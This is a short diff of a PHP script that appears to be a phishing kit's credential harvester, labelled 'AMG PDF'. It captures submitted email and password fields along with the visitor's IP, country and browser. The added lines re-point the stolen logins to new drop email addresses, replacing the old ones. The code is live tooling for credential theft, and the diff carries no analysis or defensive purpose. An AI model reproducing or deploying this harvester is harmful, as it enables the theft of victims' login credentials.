@@ -3,7 +3,7 @@ $ip = getenv("REMOTE_ADDR");
 $country = visitor_country();
 $login = $_POST['email-amg'];
 $passwd = $_POST['pass-amg'];
-$own = 'logs.me@yandex.com, amginbox@mail.com, amginbox@outlook.com, kingapel@vivaldi.net';
+$own = 'zhu.zhung@yandex.ru, frenzzybolo1@gmail.com';
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $inj = $_SERVER["REQUEST_URI"];
 $domain = 'AMG PDF';
@@ -143,4 +143,5 @@ function visitor_continentCode()
 
     return $result;
 }
+
 ?>
